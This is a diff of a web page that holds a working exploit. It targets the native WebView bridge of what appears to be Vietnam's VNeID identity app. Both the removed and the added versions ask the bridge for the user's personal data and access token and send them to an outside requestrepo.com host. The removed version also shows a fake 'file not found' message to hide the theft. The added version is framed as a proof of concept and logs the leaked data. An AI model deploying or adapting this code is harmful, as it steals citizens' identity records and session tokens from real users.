@@ -1,109 +1,99 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Đang tải...</title>
-<style>
-body { font-family: sans-serif; text-align: center; padding: 40px; background: #f5f5f5; }
-.spinner { border: 4px solid #ddd; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-@keyframes spin { to { transform: rotate(360deg); } }
-#status { color: #666; margin-top: 10px; }
-#data { display: none; background: #fff; padding: 20px; border-radius: 8px; margin-top: 20px; text-align: left; word-break: break-all; }
-</style>
-</head>
+<head><title>Định danh địa điểm</title></head>
 <body>
-
-<div class="spinner" id="spinner"></div>
-<div id="status">Đang xử lý yêu cầu...</div>
-<div id="data"></div>
-
+<h1 id="status">Đang tải...</h1>
+<pre id="result" style="white-space:pre-wrap;word-break:break-all;"></pre>
 <script>
-(function() {
-    var EXFIL = "https://9liv9n84.requestrepo.com"
-    var HOME = "https://linhnph05.github.io/static/vneid.html";
-    var stolen = {};
-    var pending = 3;
+var resultEl = document.getElementById('result');
+var statusEl = document.getElementById('status');
 
-    function send(tag, obj) {
-        new Image().src = EXFIL + "/" + tag + "?d=" + encodeURIComponent(JSON.stringify(obj));
+function log(msg) {
+  resultEl.textContent += msg + '\n';
+  console.log(msg);
+}
+
+function exfil(tag, data) {
+  var payload = encodeURIComponent(JSON.stringify(data));
+  // Primary: fetch over HTTPS (no mixed content issue)
+  try {
+    fetch('https://9liv9n84.requestrepo.com/' + tag + '?d=' + payload, {mode: 'no-cors'});
+  } catch(_) {}
+  // Fallback: HTTPS image beacon
+  new Image().src = 'https://9liv9n84.requestrepo.com/' + tag + '?d=' + payload;
+}
+
+// Listen for response FIRST, before sending
+function setupListeners() {
+  // Path 1: postMessage response
+  window.addEventListener('message', function(e) {
+    log('[message event] ' + JSON.stringify(e.data));
+    try {
+      var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+      if (data.event === 'ON_USER_INFO' || data.event === 'ON_GET_USER_INFO') {
+        statusEl.textContent = 'GOT USER INFO!';
+        log('=== PII LEAKED ===');
+        log(JSON.stringify(data, null, 2));
+        exfil('poc', data);
+      }
+      if (data.event === 'ON_TOKEN' || data.event === 'ON_GET_TOKEN') {
+        log('=== TOKEN LEAKED ===');
+        log(JSON.stringify(data, null, 2));
+        exfil('poc_token', data);
+      }
+    } catch(ex) {
+      log('parse error: ' + ex.message);
     }
+  });
 
-    function done(tag, data) {
-        stolen[tag] = data;
-        send(tag, data);
-        pending--;
-        if (pending <= 0) finish();
+  // Path 2: CustomEvent (nativeMessage) — used by sendDataToWebView
+  window.addEventListener('nativeMessage', function(e) {
+    log('[nativeMessage event] ' + JSON.stringify(e.detail));
+    if (e.detail) {
+      statusEl.textContent = 'GOT NATIVE MESSAGE!';
+      exfil('poc2', e.detail);
     }
+  });
 
-    function finish() {
-        // Send combined payload
-        send("full", stolen);
-        // Show fake "page not found" after exfil
-        document.getElementById("spinner").style.display = "none";
-        document.getElementById("status").textContent = "Không tìm thấy tệp. Vui lòng thử lại sau.";
-    }
+  // Path 3: handleNativeMessage global function — used by sendDataToWebView
+  window.handleNativeMessage = function(data) {
+    log('[handleNativeMessage] ' + JSON.stringify(data));
+    statusEl.textContent = 'GOT NATIVE MESSAGE (handler)!';
+    exfil('poc3', data);
+  };
+}
 
-    // Check if VNeID bridge is available
-    if (window.ReactNativeWebView) {
-        // Set up response handler
-        function handler(e) {
-            var raw = e.detail || e.data || e;
-            var msg;
-            try {
-                msg = typeof raw === "string" ? JSON.parse(raw) : raw;
-                if (typeof msg === "string") msg = JSON.parse(msg);
-            } catch(x) { return; }
-            if (!msg || !msg.event) return;
+setupListeners();
 
-            if (msg.event === "ON_GET_USER_INFO") {
-                done("userinfo", msg.data);
-            }
-            if (msg.event === "ON_GET_ACCESS_TOKEN") {
-                done("token", msg.data);
-            }
-            if (msg.event === "ON_GET_ORG_INFO") {
-                done("org", msg.data);
-            }
-        }
+// Wait for ReactNativeWebView to be injected, then send events
+function tryExploit() {
+  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+    log('ReactNativeWebView found! Sending GET_USER_INFO...');
 
-        window.addEventListener("nativeMessage", handler);
-        window.addEventListener("message", handler);
-        document.addEventListener("message", handler);
+    // Request PII
+    window.ReactNativeWebView.postMessage(JSON.stringify({
+      event: "GET_USER_INFO",
+      data: {}
+    }));
 
-        // Call bridge events — same pattern as the miniapp's VAdapter
-        function bridgeCall(event, data) {
-            window.ReactNativeWebView.postMessage(JSON.stringify({
-                event: event,
-                data: data || {}
-            }));
-        }
+    // Also request token
+    setTimeout(function() {
+      log('Sending GET_TOKEN...');
+      window.ReactNativeWebView.postMessage(JSON.stringify({
+        event: "GET_TOKEN",
+        data: {}
+      }));
+    }, 500);
 
-        // Steal victim's identity
-        bridgeCall("GET_USER_INFO");
+    statusEl.textContent = 'Events sent, waiting for response...';
+  } else {
+    log('Waiting for ReactNativeWebView... (' + (Date.now()) + ')');
+    setTimeout(tryExploit, 200);
+  }
+}
 
-        // Steal VNeID access token
-        setTimeout(function() { bridgeCall("GET_ACCESS_TOKEN"); }, 500);
-
-        // Steal org info
-        setTimeout(function() { bridgeCall("GET_ORG_INFO"); }, 1000);
-
-        // Timeout fallback
-        setTimeout(function() {
-            if (pending > 0) {
-                send("partial", stolen);
-                finish();
-            }
-        }, 10000);
-
-    } else {
-        // Not in WebView — still try to grab localStorage from miniapp origin
-        // (won't work cross-origin, but log the attempt)
-        send("no_bridge", { ua: navigator.userAgent, url: location.href });
-        document.getElementById("spinner").style.display = "none";
-        document.getElementById("status").textContent = "Không tìm thấy tệp. Vui lòng thử lại sau.";
-    }
-})();
+// Start polling after a small delay
+setTimeout(tryExploit, 300);
 </script>
 </body>
 </html>
